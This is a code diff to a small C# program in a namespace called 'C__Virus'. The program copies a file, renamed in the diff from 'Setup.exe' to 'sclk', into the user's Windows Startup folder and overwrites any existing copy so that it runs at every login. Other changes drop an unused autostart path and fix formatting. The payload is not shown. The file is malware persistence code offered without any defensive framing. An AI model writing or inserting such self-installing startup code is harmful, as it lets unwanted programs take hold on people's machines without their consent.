@@ -2,20 +2,21 @@
 using System.IO;
 using System.Diagnostics;
 using System.Threading;
+
 namespace C__Virus
 {
     class Program
     {
         static void Main(string[] args)
         {
+            
             try
             {
                 string path = Directory.GetCurrentDirectory();
                 string homedir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-                string fileName = "Setup.exe";
+                string fileName = "sclk";
                 string sourcePath = Directory.GetCurrentDirectory();
                 string targetPath = Path.Combine(homedir, "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup");
-                string AutostartPath = Path.Combine(homedir, "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup.Setup.exe");
                 if (Directory.GetCurrentDirectory() != targetPath)
                 {
                     // Get the current directory.;
@@ -31,12 +32,12 @@ namespace C__Virus
                     string destFile = System.IO.Path.Combine(targetPath, fileName);
 
                     if (System.IO.Directory.Exists(sourcePath))
-                    {                        
-                            // Copy the files and overwrite destination files if they already exist.
-                            // Use static Path methods to extract only the file name from the path.
-                            destFile = System.IO.Path.Combine(targetPath, fileName);
-                            string sorcFile = System.IO.Path.Combine(sourcePath, fileName);
-                            System.IO.File.Copy(sorcFile , destFile, true);
+                    {
+                        // Copy the files and overwrite destination files if they already exist.
+                        // Use static Path methods to extract only the file name from the path.
+                        destFile = System.IO.Path.Combine(targetPath, fileName);
+                        string sorcFile = System.IO.Path.Combine(sourcePath, fileName);
+                        System.IO.File.Copy(sorcFile, destFile, true);
                     }
                     else
                     {
@@ -67,5 +68,5 @@ namespace C__Virus
             }
         }
     }
-}
+} 
 
